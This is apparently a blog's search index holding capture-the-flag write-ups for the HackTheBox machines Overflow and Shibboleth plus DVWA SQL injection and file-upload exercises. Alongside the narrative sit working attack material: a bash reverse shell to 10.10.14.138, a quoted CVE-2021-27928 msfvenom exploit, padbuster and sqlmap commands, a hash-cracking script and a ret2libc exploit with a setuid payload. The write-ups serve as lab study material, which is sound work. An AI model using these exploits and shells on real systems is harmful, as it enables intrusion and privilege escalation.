print(&quot;[*] PIDs left: %d&quot; %(pids.qsize()))  except KeyboardInterrupt:    abort = True    breakRunning the program, I found one process that stood out;GDB Server is used for remotely debugging programs on a system, which makes it an interesting target for RCE. There is an exploit for this service in metasploit;Running the exploit, I got a shell on the box as the user user;I don’t like working in meterpreter shell, so I switched to a bash reverse shell with tty;PrivEscThe user is not part of any interesting groups, and I can’t view sudo permissions because I do not have their password.Going through running processes on the box using ps and htop, I found something;screen is a terminal multiplexer, and the above command is running it as the root user. If I can attach to this session, I would be able to easily run commands as root. The interesting portion of the command is screen -dmS root. Going through the help page of screen, I learned that it basically creates a screen session in detached mode with the name root.The screen program accepts the -x flag, which can be used to attach to a given session owned by a given user. Using the command screen -x root/root, I was able to attach to the screen session created by root;Summary  Identified port 22 and 80 using nmap  Port 80 is running wordpress with a vulnerable plugin (Path Traversal)  Full port scan showed port 1337 is open  Used the path traversal bug to identify the service on port 1337 (gdbserver)          Used exploit/multi/gdb/gdb_server_exec in metasploit to gain code execution on the box as the user user        Inside the box as user;          htop showed a screen session running as the user root      Attached to the session using screen -x root/root to gain a shell as root      "
  },
  
  {
    "title": "Overflow - HackTheBox",
    "url": "/posts/hackthebox/overflow.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, hard, web, smtp, oracle padding, padbuster, execute after redirect, sql injection, sqlmap, john, python, exiftool, reverse engineering, binary exploitation, ret2libc, nx, radare2",
    "date": "2022-04-09 00:00:00 +0100",
    
    "snippet": "Overflow is an amazing hard-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an oracle padding vulnerability to gain access to an admin dashboard that’s vulnerable to SQL injection, use the SQL injection to retrieve and crack a hash for another domain, which is vulnerable to an exiftool RCE.There are two local users on the box; one accessible through password reuse, and the other due to a write privilege on an important system file. For privesc, you will be exploiting a classic buffer overflow on a custom binary with a non-excutable (NX) stack.InfoReconNMAP# Nmap 7.70 scan initiated Thu Feb  3 03:04:42 2022 as: nmap -sC -sV -o nmap.txt -v overflow.htbNmap scan report for overflow.htb (10.10.11.119)Host is up (0.23s latency).Not shown: 997 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)25/tcp open  smtp    Postfix smtpd|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, | ssl-cert: Subject: commonName=overflow| Subject Alternative Name: DNS:overflow| Issuer: commonName=overflow| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-05-17T10:41:37| Not valid after:  2031-05-15T10:41:37| MD5:   9bec 0c24 e822 f27b 0e0b be7a 1e42 90ca|_SHA-1: 4423 a65c ca82 e166 4a7e 1416 d759 111b 36b3 e53280/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Feb  3 03:05:45 2022 -- 1 IP address (1 host up) scanned in 62.96 secondsWebThere is a contact form at the bottom of the page;Filling and submitting the form generated a GET request to the site’s homepage without any of the parameters, so this is probably just another broken form as commonly seen in HTB boxes.There is a login page linked at the top of the homepage;This is submitted in a simple POST request with no tokens;Using the registration page, I was able to create an account and login to the site;There is nothing of much interest in the site even after login. The blog page linked to from the homepage after login has a few entries, but only the title seems valid. All the links are dead. The titles are: Outdated Softwares, Buffer Overflows, Insecure File Uploads, and SQL Truncation Attacks. This feels like a teaser for what’s about to come.Looking more closely at the homepage, I noticed a possible username ajmal;I tested if this username existed in the website, and it didn’t because I was able to create an account with it. However, the user admin may exist in the server because I was unable to register an account with it.Fuzzing the site for hidden subdomains didn’t yield any;SMTPnmap scan on the host showed that SMTP is running on port 25, and that the vrfy command is available, which could be used to enumerate valid users. The command showed that the user root exists on the host;Using smtp-user-enum, the following users were enumerated;  www-data  root  postfix  daemon  MAILER-DAEMON  list  news  nobody  mail  postmaster.These are all default user accounts, so nothing interesting.Using netcat, I was able to send an email to the root user without any issues;Oracle PaddingI was convinced the titles of the blog entries are some sort of hints for solving this box. The only one that applies to the website at this stage is the SQL Truncation attack, so I decided to probe the account registration and login functions, since they are the only ways that let me send some data that is actually processed by the web application.Fuzzing the login parameters username and password for SQL-related attacks didn’t give me anything. However, the session cookie auth that is issued after authentication looks interesting because it looks like a URL encoded base64 string;URL-decoding and base64-decoding this, I get some string that appears to be encrypted. So I started fuzzing it manually through burp’s repeater.When adding a single character to the end of the cookie string, which could be anything, I was able to access the /home/profile/ page which is protected by authentication. If I add more than one character at the end of the cookie, I get a 302 redirect to the login page with the parameter err=1;Going to the URL, I got an interesting message;It was at this point that I actually realised the web application is vulnerable to Execute After Redirect (EAR) vulnerability because the page is actually returned when making a request without the session cookie;Going back to the cookie, I noticed that adding anything to the begining of the cookie result in an error, with exception of few characters like &#39;, &quot;, or +.I dumped the request to a text file and gave it to sqlmap, but it couldn’t find anything. Testing for SQL truncation attack in the registration function with the aim of creating another account with the username admin (which seems to be already registered) didn’t work.I continue to fuzz the website for hidden paths in hope of finding one I can access due to the EAR flaw. Fuzzing the web root, I found the directory config;Fuzzing that directory, I got a few hits;All are just PHP pages, and didn’t give me anything. Bruteforcing the /home page found a new path /home/logs.php;Going to the page, I got an Unauthorized message. I get this unauthorized message even after logging in with my test account, so this page is probably only accessible by the admin.I was stuck on this for a while, and had to take a sanity check regarding the padding error I was getting when playing with the auth cookie. I was introduced to Oracle Padding attacks, which is something I’ve never heard before :(After reading up on such attacks at https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html and some other sites, I was able to decode the cookie issued to my test account using a tool called padbuster that automate this process.To use padbuster, you need to at least supply the target URL, the encrypted string, and the block size. The url in this case is any page that process the cookie, so I chose /home/profile/. The encrypted string is the cookie value I got after login, and the block size is 8 since the base64-decoded cookie always gives 24 characters, which is a multiple of 8.With this info, I was able to decrypt the cookie I was issued using the command;$ padbuster http://overflow.htb/home/profile/ 6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9 8 -cookies &quot;auth=6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9&quot;It took quite a while, but it worked;Using the command, I was able to craft a cookie with user=admin;padbuster http://overflow.htb/home/profile/ RhNgaMySdgdBgb3N7iuvOM25sELhCZ72 8 -cookies &quot;auth=RhNgaMySdgdBgb3N7iuvOM25sELhCZ72&quot; -plaintext &quot;user=admin&quot; -verboseLoading the homepage using this cookie, I noticed two new links in the homepage;Clicking on Logs just gave me a little popup;Clicking the Admin panel, I was presented with a login form;Trying some common defaults for the login didn’t work. Checking burp to see how the /home/logs.php works, I noticed that it passes a GET parameter name with the value set to admin. Adding a single quote to test for SQL Injection gave a 500 Internal Server Error. So I dumped the request to a text file and gave it to sqlmap, and it turns out to be vulnerable;SQL InjectionAvailable databases;[*] cmsmsdb[*] information_schema[*] logs[*] OverflowTables for cmsmsdb;Database: cmsmsdb[47 tables]+-----------------------------+| cms_additional_users        |---[snip]---| cms_user_groups             || cms_userplugins             || cms_userplugins_seq         || cms_userprefs               || cms_users                   || cms_users_seq               || cms_version                 |+-----------------------------+The table cms_users contains two hashes;            EMAIL      USERNAME      PASSWORD                  admin@overflow.htb      admin      c6c6b9310e0e6f3eb3ffeb2baff12fdd                     editor      e3d748d58b58657bfa4dffe2def0b1c7      Feeding these 2 hashes to john, I was unable to crack any using rockyou.txt. This is probably just a rabbit hole, or the hashes could be salted. So I tried using the --file-read flag of sqlmap to see if I can read local files, and I couldn’t.I dumped the whole database using sqlmap and start going through the records locally in hope of finding something. Searching for the domain name in the records dumped by sqlmap, I found one;Going to the page, I got another login form;After a lot of digging, I found a hex-encoded string that could be a salt in the table cms_siteprefs(mask is another name for a salt);I was unable to get john to work with the hash, so I wrote a simple script;#!/usr/bin/pythonimport sysimport osfrom hashlib import md5if len(sys.argv) &amp;lt; 4:  print(&quot;[-] Usage: %s &amp;lt;hash&amp;gt; &amp;lt;salt&amp;gt; &amp;lt;wordlist&amp;gt;&quot; %(sys.argv[0]))  exit(1)wordlist = sys.argv[3]if not os.path.exists(wordlist):  print(&quot;[-] Invalid wordlist: &quot; + wordlist)  exit(2)wordlist = open(wordlist, &quot;rb&quot;)print(&quot;[*] Bruteforcing hash...&quot;);hash = sys.argv[1]salt = sys.argv[2]while True:  word = wordlist.readline()  if not word: # Wordlist exhausted.    break  word = word.strip()  if md5(salt + word).hexdigest() == hash:    print(&quot;[+] Success: &quot; + word)    exit(0)print(&quot;[-] Unable to crack!&quot;)exit(2)I saved the above as md5-salt-brute.py, and ran it. I was able to crack the hash of the user editor;agent47@debian:$ cat hashes.john    admin:c6c6b9310e0e6f3eb3ffeb2baff12fdd   editor:e3d748d58b58657bfa4dffe2def0b1c7admin(overflow):c71d60439ed5590b3c5e99d95ed48165agent47@debian:$ ./md5-salt-brute.py c6c6b9310e0e6f3eb3ffeb2baff12fdd 6c2d17f37e226486 /wordlists/rockyou.txt                                [*] Bruteforcing hash...                   [-] Unable to crack!                agent47@debian:$ ./md5-salt-brute.py e3d748d58b58657bfa4dffe2def0b1c7 6c2d17f37e226486 /wordlists/rockyou.txt                                [*] Bruteforcing hash...        [+] Success: alpha!@#$%bravo                 agent47@debian:$This is the only hash I could crack, but it gave me access to devbuild-job.overflow.htb;devbuild-job.overflow.htbAlmost all the links in the dashboard are dead. The profile page has a form that allows users to upload a resume;Uploading a .png file, which is not part of the listed formats, gave a File Type Not supported error that appeared only briefly.Playing with the request in burp’s repeater, I found out the web application may be depending on the file extension for validation, as changing the upload file name of a .png file succeeded, and showed what looks like an output of exiftool, along with the path the files are uploaded to;Exiftool has an RCE vulnerability tracked as CVE-2021-22204, and there is a PoC in the GitHub repo https://github.com/convisolabs/CVE-2021-22204-exiftool. Using it, I was able to spawn a shell on the box as www-data;UserInside the box as www-data, I found two local users; developer, and tester. The user tester is the one that hold the user flag. The configuration files of the site devbuild-job.overflow.htb has a MySQL credential;The password is not reused by any of the local users. The main site overflow.htb also has a MySQL credential;Testing this password against the local user account of developer worked, and I was able to login over SSH;DeveloperThe user does not have any sudo permissions, but they belong to a group called network. Searching for files that belong to this group, I got one very interesting match;I have write permissions on a very important file. If I can find any service that’s making some requests to a hostname, I can edit the /etc/hosts file so that the hostname resolves to an address I control.So I uploaded pspy to the box, and it picked up a download using curl for a shell script on the site taskmanage.overflow.htb;So I created a file named task.sh with a reverse shell payload on my box, and hosted it using python’s http.server module. I then edited the /etc/hosts file on the box and mapped the domain taskmanage.overflow.htb to my IP;After a few seconds, the file was downloaded from my attack box, and executed, which gave me access to the box as tester;PrivEscI cannot view sudo permission for the user tester as I still don’t have their password, and the user does not belong to any other group.Going through the filesystem, I found a SUID binary at /opt/file_encrypt;Running the binary, I was prompted for a PIN;So I shipped the binary to my attack box for analysis.Analysis: file_encryptagent47@debian:$ rabin2 -I file_encrypt arch     x86baddr    0x0binsz    10741bintype  elfbits     32canary   falseclass    ELF32compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0crypto   falseendian   littlehavecode trueintrp    /lib/ld-linux.so.2laddr    0x0lang     clinenum  truelsyms    truemachine  Intel 80386nx       trueos       linuxpic      truerelocs   truerelro    fullrpath    NONEsanitize falsestatic   falsestripped falsesubsys   linuxva       trueThe main function is calling check_pin(), which is likely the function doing PIN validation;[0x00000b62]&amp;gt; pdf╭ 46: int main (char **argv);│           ; arg char **argv @ esp+0x14│           0x00000b62      8d4c2404       lea ecx, [argv]│           0x00000b66      83e4f0         and esp, 0xfffffff0│           0x00000b69      ff71fc         push dword [ecx - 4]│           0x00000b6c      55             push ebp│           0x00000b6d      89e5           mov ebp, esp│           0x00000b6f      51             push ecx│           0x00000b70      83ec04         sub esp, 4│           0x00000b73      e818000000     call sym.__x86.get_pc_thunk.ax│           0x00000b78      0528240000     add eax, 0x2428│           0x00000b7d      e82effffff     call sym.check_pin│           0x00000b82      b800000000     mov eax, 0│           0x00000b87      83c404         add esp, 4│           0x00000b8a      59             pop ecx│           0x00000b8b      5d             pop ebp│           0x00000b8c      8d61fc         lea esp, [ecx - 4]╰           0x00000b8f      c3             ret[0x00000b62]&amp;gt;Disassembly of sym.check_pin;[0x56602ab0]&amp;gt; pdf                                                                                                                                 ; CALL XREF from main @ 0x56602b7d╭ 178: sym.check_pin ();│           ; var int32_t var_28h @ ebp-0x28│           ; var int32_t var_14h @ ebp-0x14                                                                                          │           ; var uint32_t var_10h @ ebp-0x10                                                                                         │           ; var int32_t var_ch @ ebp-0xc│           ; var int32_t var_4h @ ebp-0x4│           0x56602ab0      55             push ebp│           0x56602ab1      89e5           mov ebp, esp│           0x56602ab3      53             push ebx│           0x56602ab4      83ec24         sub esp, 0x24                                                                              │           0x56602ab7      e864fcffff     call sym.__x86.get_pc_thunk.bx                                                             │           0x56602abc      81c3e4240000   add ebx, 0x24e4│           0x56602ac2      e8e9fbffff     call sym.imp.rand           ; int rand(void)                                               │           0x56602ac7      8945f4         mov dword [ebp - 0xc], eax                                                                 │           0x56602aca      83ec0c         sub esp, 0xc                                                                               │           0x56602acd      ff75f4         push dword [ebp - 0xc]                                                                     │           0x56602ad0      e848fdffff     call sym.random             ; uint32_t random(void)                                        │           0x56602ad5      83c410         add esp, 0x10│           0x56602ad8      8945f0         mov dword [ebp - 0x10], eax                                                                │           0x56602adb      83ec08         sub esp, 8│           0x56602ade      ff75f4         push dword [ebp - 0xc]│           0x56602ae1      8d8358ddffff   lea eax, [ebx - 0x22a8]                                                                    │           0x56602ae7      50             push eax                    ; const char *format                                           │           0x56602ae8      e8f3faffff     call sym.imp.printf         ; int printf(const char *format)                               │           0x56602aed      83c410         add esp, 0x10│           0x56602af0      83ec08         sub esp, 8│           0x56602af3      8d45ec         lea eax, [ebp - 0x14]│           0x56602af6      50             push eax│           0x56602af7      8d837dddffff   lea eax, [ebx - 0x2283]│           0x56602afd      50             push eax                    ; const char *format│           0x56602afe      e8bdfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)│           0x56602b03      83c410         add esp, 0x10│           0x56602b06      8b45ec         mov eax, dword [ebp - 0x14]│           0x56602b09      3945f0         cmp dword [ebp - 0x10], eax│       ╭─&amp;lt; 0x56602b0c      753c           jne 0x56602b4a│       │   0x56602b0e      83ec0c         sub esp, 0xc│       │   0x56602b11      8d8380ddffff   lea eax, [ebx - 0x2280]│       │   0x56602b17      50             push eax                    ; const char *format│       │   0x56602b18      e8c3faffff     call sym.imp.printf         ; int printf(const char *format)│       │   0x56602b1d      83c410         add esp, 0x10│       │   0x56602b20      83ec08         sub esp, 8│       │   0x56602b23      8d45d8         lea eax, [ebp - 0x28]│       │   0x56602b26      50             push eax│       │   0x56602b27      8d83c3dcffff   lea eax, [ebx - 0x233d]│       │   0x56602b2d      50             push eax                    ; const char *format│       │   0x56602b2e      e88dfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)│       │   0x56602b33      83c410         add esp, 0x10│       │   0x56602b36      83ec0c         sub esp, 0xc│       │   0x56602b39      8d8388ddffff   lea eax, [ebx - 0x2278]│       │   0x56602b3f      50             push eax                    ; const char *s│       │   0x56602b40      e8fbfaffff     call sym.imp.puts           ; int puts(const char *s)│       │   0x56602b45      83c410         add esp, 0x10│      ╭──&amp;lt; 0x56602b48      eb12           jmp 0x56602b5c│      ││   ; CODE XREF from sym.check_pin @ 0x56602b0c│      │╰─&amp;gt; 0x56602b4a      83ec0c         sub esp, 0xc│      │    0x56602b4d      8d83e3ddffff   lea eax, [ebx - 0x221d]│      │    0x56602b53      50             push eax                    ; const char *s│      │    0x56602b54      e8e7faffff     call sym.imp.puts           ; int puts(const char *s)│      │    0x56602b59      83c410         add esp, 0x10│      │    ; CODE XREF from sym.check_pin @ 0x56602b48│      ╰──&amp;gt; 0x56602b5c      90             nop│           0x56602b5d      8b5dfc         mov ebx, dword [ebp - 4]│           0x56602b60      c9             leave╰           0x56602b61      c3             ret[0x56602ab0]&amp;gt;There are multiple calls to scanf(), which is used to read input from the user. So I opened the binary in debug mode and set a breakpoint after the first call to scanf() at 0x56635b03. The instruction at 0x56635b09 compares the value of eax (which is where the PIN we entered is stored), with the value in var_10h (ebp - 0x10);Since the comparison is with eax, which is a 32 bit register, I read 4 bytes from the other operand, which gave 0xf3e6d338. Converting this to 32 bit signed integer, I got -202976456;This value is the valid PIN, and it was accepted by the binary;After that, we were prompted for a name, and the program printed out a message, and then exit. The way the program reads the name could be vulnerable to buffer overflow. The name read is stored at var_28h (ebp - 0x28);A memory address in x86 is 32 bit. Since the destination address is 40 bytes (0x28) bytes away from the base of the stack frame (EBP), we will be able to overwrite the saved EBP of main() (the caller) after writing 40 bytes, and the EIP after 44 bytes. Testing this in gdb, it worked as expected. The binary is vulnerable to buffer overflow attack;And it gets better too, because ASLR is disabled on the box;Exploitation: ret2libcThe binary has a non-executable stack (NX/DEP), so this won’t be as simple as loading shellcode into the stack, and jumping to it. An exploitation technique that can be used to get around this is return to libc (ret2libc) attack. This attack works by overwriting the EIP with the address of a function in the libc library (like system or execv), and passing it an argument we control (like the address of /bin/sh string in the libc library). This works because no code is executed on the stack.To exploit this, I need to write 44 bytes of padding, followed by the address of execv() to overwrite the EIP. followed by the address of exit() which will be the return address for clean exit, and then followed by the address of a string containing the full path of the binary I wished to execute. I used execv() because unlike system(), it does not drop privileges when spawning a new process.The first step is figuring out the address of execv(), exit(), and the environment variable PAYLOAD (which I set to the path of my reverse shell). For this, I wrote a simple C program;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;int main(){  printf(&quot;Addr of system():   0x%08x\\n&quot;, &amp;amp;execv);  printf(&quot;Addr of exit():     0x%08x\\n&quot;, &amp;amp;exit);  printf(&quot;Addr of $PAYLOAD:   0x%08x\\n&quot;, getenv(&quot;PAYLOAD&quot;));    return 0;}Notice how the address of $PAYLOAD changes based on the length of the filename;We need to account for this when calling the binary at /opt/file_encrypt/file_encrypt. Since it is 30 characters long, I renamed the address dumper to /dev/shm/dump_addrssssssssssss. This will give me the correct address of $PAYLOAD when calling /opt/file_encrypt/file_encrypt. We now have our valid addresses;Using python, I built a simple ret2libc payload;#!/usr/bin/python2import structbuffer = &quot;A&quot; * 44execv = struct.pack(&quot;I&quot;, 0xf7ea8730)exit = struct.pack(&quot;I&quot;, 0xf7e194b0)payload = struct.pack(&quot;I&quot;, 0xffffdf44)print &quot;-202976456&quot; + &quot;\\n&quot; + buffer + execv + exit + payloadI generated the buffer and saved it in my web directory;On the remote host, I set PAYLOAD to /dev/shm/payload, where payload is a shell script containing a simple bash reverse shell. The exploit worked, but I got a shell as my current user. The privileges were dropped;So I wrote a simple C payload that will elevate to higher privileges using setuid() and setgid() before calling my reverse shell;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main(){  setuid(0);  setgid(0);  char *args[] = {&quot;revshell.sh&quot;, NULL};  execv(&quot;/dev/shm/revshell.sh&quot;, args);  return 0;}I compiled and pushed the program to /dev/shm/payload, which is the value in my $PAYLOAD variable. Running the exploit again, I got a shell on the box as root;Summary  Discovered port 22, 25, and 80 using nmap  Found an open signup on the website, and created a test account.  Identified a possible username admin that exist on the website.  Used Oracle Padding attack to craft a cookie that gave access to the account of admin          Found an SQL injection vulnerability in /home/logs.php      Used sqlmap to dump some hashes, and discovered the domain devbuild-job.overflow.htb      Gained access to the domain by cracking the salted hash of the user editor        devbuild-job.overflow.htb          Found a file upload form that is passed to exiftool.      Exploited CVE-2021-22204 to gain code execution as www-data        Inside as www-data          Found 2 local users; developer, and tester (holds user.txt)      Recovered MySQL credentials in config files of devbuild-job.overflow.htb domain.      Gained access to account of developer due to password reuse.        Inside as developer          Identified a write access to /etc/hosts      pspy showed requests to http://taskmanage.overflow.htb/task.sh, which I hijacked by editing the /etc/hosts file to gain code execution as tester        Inside as tester          Found a SUID binary at /opt/file_encrypt/file_encrypt      Binary is protected by a PIN.      Reversed the binary using radare2 to extract the PIN.      Identified a buffer overflow vulnerability in the binary.      Performed a ret2libc attack to gain code execution as root      "
  },
  
  {
    "title": "Shibboleth - HackTheBox",
    "url": "/posts/hackthebox/shibboleth.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, zabbix, udp, ipmi, mysql, wsrep, metasploit, asf-rmcp",
    "date": "2022-04-02 00:00:00 +0100",
    
    "snippet": "Shibboleth is a relatively easy medium linux box. It’s running an instance of Zabbix which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port 623 to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.InfoRecon# Nmap 7.70 scan initiated Sat Nov 13 20:49:39 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.124Nmap scan report for shibboleth.htb (10.10.11.124)Host is up (0.24s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.41|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34| http-methods: |_  Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: FlexStart Bootstrap Template - IndexRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Nov 13 20:50:24 2021 -- 1 IP address (1 host up) scanned in 45.09 secondsWebAttempt to send an email using the contact-us form showed an error;Bruteforcing for subdomains with ffuf discovered 3;All the three subdomains show the same page;Hovering on the help link below the login form showed a URL to an online documentation that revealed the version number of Zabbix, which is 5.0. Googling revealed a couple of vulnerabilities that require no authentication, but none of the ones I tested worked.I was stuck at this for quite a while before remembering to do a UDP scan on the host. This is something I always completely forget to do, which should have been obvious since NMAP only discovered one TCP port on the target. Running nmap in UDP mode, I got a hit;Service scan with nmap identified it as asf-rmcp, which according to Tenable, is;  ASF is a DMTF standard that provides a remote control and alerting interface between management consoles and ASF-aware hosts. RMCP is a network protocol used by a management console to remotely control an ASF-aware host.Googling more about the service, the site https://book.hacktricks.xyz has some notes on it;Running the metasploit module showed above, I got a hash for a user named Administrator;Feeding the hash to john, it had no trouble cracking it (ilovepumkinpie1);Using the password, I was able to login to the Zabbix admin dashboard;FootholdI have never worked with Zabbix before doing this box, so I had to read quite a bit on how it works. It’s basically a monitoring system used to monitor hosts, also referred to as Zabbix agents. In the Zabbix dashboard, there is an agent with the name shibboleth.htb;I learned that an “item”, which contain a “key”, can be added to an agent, and can be used to automate tasks that need to be performed after a defined interval. The key system.run[] is of interest to me as it can be used to run shell commands on an agent. Going to the items tab, I was given an option to create a key. So I created one that will ping my attack host after every one minute, and setup tcpdump to look for ICMP packets. It worked;After saving the item, I got a callback after a moment;Adding a bash reverse shell in the system.run[] key works, but exited immediately after the shell has been spawned. I assumed this is because Zabbix is killing the spawned process, so I wrote a bash script named shell.sh that spawn a bash reverse shell as a background thread, download it on the host using curl , and execute it (I used the test button showed when creating an Item in Zabbix to run the command right away);#!/bin/bash# Spawn the reverse shell in a background thread.bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.138/443 0&amp;gt;&amp;amp;1 &amp;amp;# Exit the main thread before Zabbix kills it :)exit 0I got a stable reverse shell after that as the user zabbix;PrivEscThere is a user account named ipmi-svc on the host. Testing the password ilovepumkinpie1 (which is the password for the Zabbix administrator) gave me access to the account, and the user flag;The user does not have any sudo access. netstat showed a MySQL service running locally on the host. So I started going through config files, and found a credential in /etc/zabbix/zabbix_server.conf;Using the credential, I was able to access the Zabbix database locally, and found 3 hashes in a table named users;The hash highlighted above is for a password I already have, and the one for the user Zabbix could not be cracked after +30 minutes of bruteforce with john. So I moved on.Checking the privileges of the zabbix MySQL user;Version number of MySQL components;Searching the version numbers using searchsploit, an exploit was found for the entry highlighted above;# Exploit Title: MariaDB 10.2 /MySQL - &#39;wsrep_provider&#39; OS Command Execution# Date: 03/18/2021# Exploit Author: Central InfoSec# Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL# Tested on: Linux# CVE : CVE-2021-27928# Proof of Concept:# Create the reverse shell payloadmsfvenom -p linux/x64/shell_reverse_tcp LHOST=&amp;lt;ip&amp;gt; LPORT=&amp;lt;port&amp;gt; -f elf-so -o CVE-2021-27928.so# Start a listenernc -lvp &amp;lt;port&amp;gt;# Copy the payload to the target machine (In this example, SCP/SSH is used)scp CVE-2021-27928.so &amp;lt;user&amp;gt;@&amp;lt;ip&amp;gt;:/tmp/CVE-2021-27928.so# Execute the payloadmysql -u &amp;lt;user&amp;gt; -p -h &amp;lt;ip&amp;gt; -e &#39;SET GLOBAL wsrep_provider=&quot;/tmp/CVE-2021-27928.so&quot;;&#39;Using the steps outlined above, I generated an elf reverse shell, download it on the host using wget, and exploit the flaw to gain root access to the box;Summary  Identified a web service on the host on port 80 using nmap  Found Zabbix installation on the host by bruteforcing with ffuf  Identified an asf-rmcp service running on UDP port 623  Used auxiliary/scanner/ipmi/ipmi_dumphashes metasploit module, and obtained the password hash of the user Administrator. Cracking it gave me access to the admin dashboard of Zabbix.  Inside Zabbix dashboard;          Found a Zabbix agent with the name shibboleth.htb      Spawned a shell on it using system.run[] Item key, which gave me access to the box as zabbix user.        Inside the box as zabbix;          Identified a local user account with the username ipmi-svc.      Gained access to the account due to password reuse.        Inside the box as ipmi-svc;          Found a credential for the local MySQL service used by the Zabbix installation.      Identified a vulnerable component used by the server.      Found an exploit using searchsploit, which gave me root access to the box.      "
  },
  
  {
    "title": "Error-based SQL Injection- DVWA",
    "url": "/posts/dvwa/dvwa_sqli_error_based.html",
    "categories": "dvwa",
    "tags": "dvwa, sql injection, sqlmap",
    "date": "2022-03-27 00:00:00 +0100",
    
    "snippet": "This is an exercise in OWASP DVWA for exploiting SQL injection.Error-based SQL Injection - DVWADifficulty: EasyIn this mode, we are presented with a form to enter a user ID, which is used to display the first name and surname of a user;Adding a single quote to the input gave an SQL error;This means we have an error-based SQL injection. The payload 1&#39; order by 2-- - didn’t give any error, but 1&#39; order by 3-- - did, which means the query we are injecting to is retrieving 2 columns. Injecting a union query showed that both columns are reflected in the response;Name of the current database;Existing databases;Tables in dvwa databases;users looks interesting. Let’s see what columns it have;Looks like this table is used to store user credentials;I copied these hashes to a format john can process, and was able to crack them;Difficulty: MediumIn this mode, the form is different. It uses a set of predefined user IDs as input;This means we will have to rely on a proxy for injection. Intercepting the request in mitmproxy and testing for SQL injection using a single quote gave an error;Same thing happens when injecting with double quotes. Injecting without any quote worked, which means the application is likely injecting the user input directly without enclosing in quote, which will work since the developer expects the input to be an integer;This injection can be exploited much more conveniently using tools like sqlmap, and I was able to use it to dump the hashes in the users table;sqlmap -u &#39;http://buster/dvwa/vulnerabilities/sqli/&#39; --data &#39;id=1&amp;amp;Submit=Submit&#39; --cookie &#39;security=medium; PHPSESSID=5c8siun1tr567gd519v1mivcbi&#39; -D dvwa -T users --dumpDifficulty: High            This mode also gives a different form. The payload used in [[06 - SQL Injection - Error-based#Difficulty Easy      easy mode]] also worked in this mode, the only twist is that a seperate window is created in browser for user input, while the results are displayed in the main window;      "
  },
  
  {
    "title": "File Upload- DVWA",
    "url": "/posts/dvwa/dvwa_file_upload.html",
    "categories": "dvwa",
    "tags": "dvwa, file upload, rce, magic bytes",
    "date": "2022-03-27 00:00:00 +0100",
    
    "snippet": "This is an exercise in OWASP DVWA for exploiting file upload vulnerabilities.File Upload - DVWADifficulty: EasyIn this mode, we are presented with a file upload form;As expected, there is no filter, and I was able to upload a PHP code that execute a bash reverse shell;The web application is kind enough to give us the path of the upload. Going to the URL, I got a shell on the box;Difficulty: MediumAttempt to upload a PHP file failed, saying only JPEG or PNG images are accepted;This means the web application is now filtering our uploads, which means we need to play around with the upload request. mitmproxy does not work well with multipart forms in my experience, so I fired up burp, and this is what a failed upload of a PHP file look like;Changing the Content-Type parameter to image/png successfully bypassed the filter, and gave us code execution;Difficuly: HardIn this mode, the application appears to be filtering files based on their contents because changing the file extension, as well as the value of the Content-Type parameter didn’t work;A good way to get around this is using magic bytes, which are series of bytes, normally at the beginning of a file, that are unique to that file type. So I created a normal PNG file named test.png, and used head to extract the first 20 bytes it has and prefixed it to our PHP payload;This approach worked, but the web app is also filtering file extension, so I was unable to gain code execution. However, this can still be exploited to gain code execution by chaining it with the LFI vuln in DVWA."
  },
  
  {
    "title": "File Inclusion - DVWA",
    "url": "/posts/dvwa/dvwa_file_inclusion.html",
    "categories": "dvwa",
    "tags": "dvwa, lfi, rfi, rce, kadiums",
    "date": "2022-03-27 00:00:00 +0100",
    
